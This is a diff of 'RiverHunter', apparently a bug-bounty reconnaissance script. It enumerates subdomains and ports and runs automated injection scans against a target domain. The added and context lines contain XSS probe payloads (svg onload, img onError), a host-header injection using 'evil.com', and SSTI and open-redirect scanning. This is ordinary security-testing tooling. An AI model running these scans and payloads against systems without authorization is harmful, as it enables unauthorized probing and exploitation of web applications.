@@ -29,8 +29,12 @@ TOOLS_DIR="$HOME/tools"
 WORDLISTS_DIR="$HOME/wordlists"
 # Activate the virtual environment
 source "$HOME/.recon_venv/bin/activate"
+
 # Add these new tool paths and outputs
+SCRIPTPATH="$( cd "$(dirname "$0")" >/dev/null 2>&1 ; pwd -P )"
+banner_file="${SCRIPTPATH}/banners.txt"
 fuzz_file="$HOME/wordlists/directory_wordlist.txt"
+xss_list="$HOME/wordlists/xss-payloads.txt"
 json_file="${dirdomain}/info/leaks.json"
 leaks_file="${dirdomain}/info/porchemails.txt"
 iptxt="${dirdomain}/info/ip.txt"
@@ -154,7 +158,6 @@ create_directories() {
         "${dirdomain}/subdomains/.tmp"
         "${dirdomain}/osint"
         "${dirdomain}/info"
-        "${dirdomain}/wordlists"
         "${dirdomain}/fuzzing"
         "${dirdomain}/parameters"
         "${dirdomain}/vulnerability"
@@ -171,20 +174,20 @@ create_directories() {
 create_directories
 ports="21,22,23,25,53,69,80,88,110,115,123,137,139,143,161,179,194,389,443,445,465,500,546,547,587,636,993,994,995,1025,1080,1194,1433,1434,1521,1701,1723,1812,1813,2049,2222,2375,2376,3306,3389,3690,4443,5432,5800,5900,5938,5984,6379,6667,6881,8080,8443,8880,9090,9418,9999,10000,11211,15672,27017,28017,3030,33060,4848,5000,5433,5672,6666,8000,8081,8444,8888,8905,9000,9042,9160,9990,11210,12201,15674,18080,1965,1978,2082,2083,2086,2087,2089,2096,22611,25565,27018,28015,33389,4369,49152,54321,54322,55117,55555,55672,5666,5671,6346,6347,6697,6882,6883,6884,6885,6886,6887,6888,6889,8088,8089,9001,9415,17089,27019,34443,3659,45557,55556,5673,5674,6370,6891,6892,6893,6894,6895,6896,6897,6898,6899,6900,6901,6902,6903,6904,6905,6906,6907,6908,6909,6910,6911,6912,6913,6914,6915,6916,6917,6918,6919,6920,6921,6922,6923,6924,6925,6926,81,300,591,593,832,981,1010,1311,1099,2095,2480,3000,3128,3333,4242,4243,4567,4711,4712,4993,5104,5108,5280,5281,5601,5985,6543,7000,7001,7396,7474,8001,8008,8014,8042,8060,8069,8083,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8500,8184,8834,8983,9043,9060,9080,9091,9200,9443,9502,9800,9981,10250,11371,12443,16080,17778,18091,18092,20720,32000,55440,22222,32400"
 printf "${GREEN} 
-                        ⣿⣿⣿⣿⣿⣿⣿⣉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-                        ⣿⣿⣿⣿⣿⣿⣿⣿⣷⡈⢿⣿⣿⣿⣿⣿⣿⡏⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-                        ⣿⣿⣿⣿⣿⣿⣍⡙⢿⣿⣦⡙⠻⣿⣿⣿⡿⠁⣾⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿
-                        ⣿⣿⣿⣿⣿⣿⣿⣿⣦⡉⠛⠓⠢⡈⢿⡿⠁⣸⣿⡿⠿⢋⣴⣿⣿⣿⣿⣿⣿⣿
-                        ⣿⣿⣿⣿⣿⣿⣯⣍⣙⡋⠠⠄⠄⠄⠄⠁⠘⠁⠄⠴⠚⠻⢿⣿⣿⣿⣿⣿⣿⣿  <<  RiverHunter TOOL >>
-                        ⣿⣿⣿⣿⣿⣿⣿⡿⠿⢏⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⣿⣿⣿⣿  <<  CODED BY RiverHunter >>
-                        ⣿⣿⣿⣿⣿⣧⡴⠖⠒⠄⠁⠄⢀⠄⠄⠄⡀⠄⠄⠄⠄⠄⠄⣠⣿⣿⣿⣿⣿⣿  <<  INSTAGRAM==>RiverHunter >>
-                        ⣿⣿⣿⠿⠟⣩⣴⣶⣿⣿⣶⡞⠉⣠⣇⠄⣿⣶⣦⣄⡀⠲⢿⣿⣿⣿⣿⣿⣿⣿
-                        ⣿⣿⣷⣶⣾⣿⣿⣿⣿⣿⡿⢠⣿⣿⣿⢀⣿⣿⣿⣿⣿⣿⣶⣌⠻⠿⣿⣿⣿⣿ 
-                        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢡⣿⣿⣿⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣿⣿ 
-                        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ \n
-                        / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
-                       ( R | e | v | e | r | H | u | n | t | e | r )
-                        \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/   \n "
+⣿⣿⣿⣿⣿⣿⣿⣉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣷⡈⢿⣿⣿⣿⣿⣿⣿⡏⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣍⡙⢿⣿⣦⡙⠻⣿⣿⣿⡿⠁⣾⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣦⡉⠛⠓⠢⡈⢿⡿⠁⣸⣿⡿⠿⢋⣴⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣯⣍⣙⡋⠠⠄⠄⠄⠄⠁⠘⠁⠄⠴⠚⠻⢿⣿⣿⣿⣿⣿⣿⣿  <<  RiverHunter TOOL >>
+⣿⣿⣿⣿⣿⣿⣿⡿⠿⢏⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⣿⣿⣿⣿  <<  CODED BY RiverHunter >>
+⣿⣿⣿⣿⣿⣧⡴⠖⠒⠄⠁⠄⢀⠄⠄⠄⡀⠄⠄⠄⠄⠄⠄⣠⣿⣿⣿⣿⣿⣿  <<  INSTAGRAM==>RiverHunter >>
+⣿⣿⣿⠿⠟⣩⣴⣶⣿⣿⣶⡞⠉⣠⣇⠄⣿⣶⣦⣄⡀⠲⢿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣷⣶⣾⣿⣿⣿⣿⣿⡿⢠⣿⣿⣿⢀⣿⣿⣿⣿⣿⣿⣶⣌⠻⠿⣿⣿⣿⣿ 
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢡⣿⣿⣿⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣿⣿ 
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ \n
+ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
+( R | e | v | e | r | H | u | n | t | e | r )
+ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/   \n "
 printf "          ${YELLOW}RiverHunter>${end}${GREEN} More Targets - More Options - More Opportunities${end}" | pv -qL 30
 sleep 0.4
 printf  "${NORMAL}\n[${BLINK}${CROSS}] ${NORMAL}${NORMAL}${LRED}Warning: Use with caution. You are responsible for your own actions.${NORMAL}\n"| pv -qL 30
@@ -221,7 +224,7 @@ scan_subdomains() {
     echo -e "\033[2A"
     echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}findomain${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/findomain.txt 2> /dev/null | wc -l )"
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}sublist3r${NORMAL}]"
-    python3 ~/tools/Sublist3r/sublist3r.py -d $target -o ${dirdomain}/subdomains/sublister.txt &> /dev/null
+    python3 $TOOLS_DIR/Sublist3r/sublist3r.py -d $target -o ${dirdomain}/subdomains/sublister.txt &> /dev/null
     echo -e "\033[2A"
     echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}sublist3r${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/sublister.txt 2> /dev/null | wc -l )"
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}amass${NORMAL}]"
@@ -264,15 +267,11 @@ curl -s "https://api.certspotter.com/v1/issuances?domain=${target}&include_subdo
     echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}Urlscan${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/Urlscan.txt 2> /dev/null | wc -l )" 
     # Add puredns for subdomain enumeration
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}puredns${NORMAL}]"
-    puredns bruteforce $WORDLISTS_DIR/subdomain_megalist.txt $target -r $WORDLISTS_DIR/resolvers.txt -w $puredns_output &> /dev/null
+    puredns bruteforce $WORDLISTS_DIR/subdomain_megalist.txt $target --resolvers $WORDLISTS_DIR/resolvers.txt --quiet | anew -q $puredns_output &> /dev/null
     echo -e "\033[2A"
-    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}puredns${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/puredns.txt 2> /dev/null | wc -l)"
+    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}puredns${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat $puredns_output 2> /dev/null | wc -l)"
 
-    # Add shuffledns for subdomain enumeration
-    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}shuffledns${NORMAL}]"
-    shuffledns -d $target -w $WORDLISTS_DIR/subdomain_megalist.txt -r $WORDLISTS_DIR/resolvers.txt -o $shuffledns_output &> /dev/null
-    echo -e "\033[2A"
-    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}shuffledns${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/shuffledns.txt 2> /dev/null | wc -l)"
+   
 
 
  echo -ne "\n${NORMAL}${BOLD}${YELLOW}[●] Filtering Alive subdomains\r"
@@ -288,6 +287,7 @@ cat -s ${dirdomain}/subdomains/httpx.txt | grep -Eo "https?://[^/]+\.${target}" 
 # Function to DNSx enumeration
 DNSx_enumeration() {
     # Add DNSx enumeration
+    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Starting DNSx enumeration for  ${YELLOW}$target${NORMAL}\n"
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] DNSx Scanning  -  ${NORMAL}[${LRED}${BLINK}DNSx${NORMAL}]"
     cat ${dirdomain}/subdomains/subdomains.txt | dnsx -silent -a -aaaa -cname -ns -txt -ptr -mx -soa -resp -json -o $dnsx_output&>/dev/null 
     echo -e "\033[2A"
@@ -471,51 +471,39 @@ get_ips() {
 
  # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #  
     echo "Getting IPs of subdomains..."
- cat ${dirdomain}/subdomains/subdomains.txt | dnsx -a --resp-only --silent | anew $iptxt  &> /dev/null
- cat ${dirdomain}/subdomains/subdomains.txt | dnsx -a --resp --silent | anew ${dirdomain}/info/domain_ips.txt   &> /dev/null 
+ cat ${dirdomain}/subdomains/livesubdomain.txt | dnsx -a --resp-only --silent | anew $iptxt  &> /dev/null
+ cat ${dirdomain}/subdomains/livesubdomain.txt | dnsx -a --resp --silent | anew ${dirdomain}/info/dom_ips.txt   &> /dev/null 
+ cat ${dirdomain}/info/dom_ips.txt |sed -e 's/\x1b\[[0-9;]*m//g' -e 's/\[A\] \[\(.*\)\]/     \1/'| anew ${dirdomain}/info/domain_ips.txt   &> /dev/null 
  naabu -list $iptxt -p $ports -c 150 --silent -o ${dirdomain}/info/portscan.txt    
  }
  # Function to check for vulnerabilities
 check_vulnerabilities() {
 
-# Add CMSeeK scanning
-    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Scanning CMS  -  ${NORMAL}[${LRED}${BLINK}CMSeeK${NORMAL}]"
-    for url in $(cat ${dirdomain}/subdomains/livesubdomain.txt); do
-        python3 $TOOLS_DIR/CMSeeK/cmseek.py -u $url --batch -r >> $cmseek_output
-    done
-    echo -e "\033[2A"
-    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Scanning CMS  -  ${NORMAL}[${GREEN}CMSeeK${TICK}${NORMAL}]${TTAB} CMS Found: ${LGREEN}$(cat $cmseek_output 2> /dev/null | wc -l )"
+
  # Add gxss scanning
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] XSS Scanning with gxss  -  ${NORMAL}[${LRED}${BLINK}Scanning${NORMAL}]"
     cat ${dirdomain}/parameters/endpoints.txt | Gxss -c 100 -p Xss | grep "=" | qsreplace '"><svg onload=confirm(1)>' | while read url; do
-        curl -s -L "$url" | grep -qs "<svg onload=confirm(1)>" && echo "$url" >> $gxss_output
+         curl -s -L "$url" | grep -qs "<svg onload=confirm(1)>" && echo "$url" >> $gxss_output
     done
  
 echo -e "\033[2A"
     echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] XSS Scanning with gxss -  ${NORMAL}[${GREEN}Scanning${TICK}${NORMAL}]${TTAB} XSS Found: ${LGREEN}$(cat $gxss_output 2> /dev/null | wc -l )"
 echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] XSS Scanning with freq  -  ${NORMAL}[${LRED}${BLINK}Scanning${NORMAL}]"
- payload=$(cat "$xss_list")
- cat ${dirdomain}/parameters/endpoints.txt | qsreplace '$payload' | freq | egrep -v 'Not' | anew -q $freq_output &> /dev/null
+  payload=$(cat "$xss_list")
+  cat ${dirdomain}/parameters/endpoints.txt | qsreplace '$payload' | freq | egrep -v 'Not' | anew -q $freq_output &> /dev/null
 echo -e "\033[2A"
 echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] XSS Scanning with freq -  ${NORMAL}[${GREEN}Scanning${TICK}${NORMAL}]${TTAB} XSS Found: ${LGREEN}$(cat $freq_output 2> /dev/null | wc -l )" 
- 
-printf "${NORMAL}${yellow}Gathering endpoints that they return 403 status code...${NORMAL}\n\n"
-  cat ${dirdomain}/parameters/endpoints.txt |  httpx -silent -sc -title | grep 403 | grep "$target" | cut -d' ' -f1 | tee ${dirdomain}/parameters/endpoints_403.txt&> /dev/null
+ echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] XSS Scanning with airixss  -  ${NORMAL}[${LRED}${BLINK}Scanning${NORMAL}]"
+cat ${dirdomain}/parameters/endpoints.txt | gf xss | qsreplace '"><svg/onload=prompt(document.domain)>' | airixss -p 'prompt(document.domain)' | egrep -v 'Not' | anew ${dirdomain}/vulnerability/airi.txt &> /dev/null
+cat ${dirdomain}/parameters/endpoints.txt | gf xss| qsreplace '"><img src=IDONTNO onError=confirm(1337)>' | airixss -p 'confirm(1337)>' | egrep -v 'Not' | anew ${dirdomain}/vulnerability/airi.txt &> /dev/null
+cat ${dirdomain}/parameters/endpoints.txt | gf xss | qsreplace '"></script><hTMl onmouseovER=prompt(1447)>' | airixss -p 'onmouseovER=prompt(1447)>' | egrep -v 'Not' | anew ${dirdomain}/vulnerability/airi.txt &> /dev/null
+cat ${dirdomain}/parameters/endpoints.txt | gf xss | qsreplace '"><iframe src=x>' | airixss -p 'src=x>' | egrep -v 'Not' | anew ${dirdomain}/vulnerability/airi.txt &> /dev/null
 
-	printf "\n${NORMAL}${CYAN}Trying to bypass 403 status code...${NORMAL}\n\n"
-	for url in $(cat $dirdomain/parameters/endpoints_403.txt);
-	do
+cat ${dirdomain}/vulnerability/airi.txt | awk '{ print $3 }' | sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" > ${dirdomain}/vulnerability/vuln-injections.txt &> /dev/null
 
-	      		bash $TOOLS_DIR/403-bypass.sh -u $url --exploit 
-	done
-	
-  cat ${dirdomain}/parameters/endpoints.txt | qsreplace 'kalirfl' | httpx -silent -ms 'kalirfl' -o ${dirdomain}/parameters/refletidos.txt -t 75
-cat ${dirdomain}/parameters/refletidos.txt | qsreplace '"><svg/onload=prompt(document.domain)>' | airixss -p 'prompt(document.domain)' | egrep -v 'Not' | anew ${dirdomain}/vulnerability/airi.txt
-cat ${dirdomain}/parameters/refletidos.txt | qsreplace '"><img src=IDONTNO onError=confirm(1337)>' | airixss -p 'confirm(1337)>' | egrep -v 'Not' | anew ${dirdomain}/vulnerability/airi.txt
-cat ${dirdomain}/parameters/refletidos.txt | qsreplace '"></script><hTMl onmouseovER=prompt(1447)>' | airixss -p 'onmouseovER=prompt(1447)>' | egrep -v 'Not' | anew ${dirdomain}/vulnerability/airi.txt
-cat ${dirdomain}/parameters/refletidos.txt | qsreplace '"><iframe src=x>' | airixss -p 'src=x>' | egrep -v 'Not' | anew ${dirdomain}/vulnerability/airi.txt
+echo -e "\033[2A"
+echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] XSS Scanning with airixss -  ${NORMAL}[${GREEN}Scanning${TICK}${NORMAL}]${TTAB} XSS Found: ${LGREEN}$(cat ${dirdomain}/vulnerability/vuln-injections.txt 2> /dev/null | wc -l )" 
 
-cat ${dirdomain}/vulnerability/airi.txt | awk '{ print $3 }' | sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" > ${dirdomain}/vulnerability/vuln-injections.txt 
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}Host Header Injection${NORMAL}]\r"
 for i in $(cat ${dirdomain}/subdomains/livesubdomain.txt); do
      file=$(curl -s -m5 -I  "{$i}" -H "X-Forwarded-Host: evil.com" &> /dev/null)  
@@ -564,7 +552,7 @@ cat ${dirdomain}/parameters/redirect.txt | openredirex --keyword FUZZ -p $TOOLS_
     
       echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}SSTI${NORMAL}]\r"
 for url in $(cat ${dirdomain}/parameters/ssti.txt);do
-tinja url -u $url
+TInjA url -u $url
 done
     echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}SSTI${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat $dirdomain/vulnerability/ssti.txt 2> /dev/null | wc -l )"
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}Prototype${NORMAL}]\r"
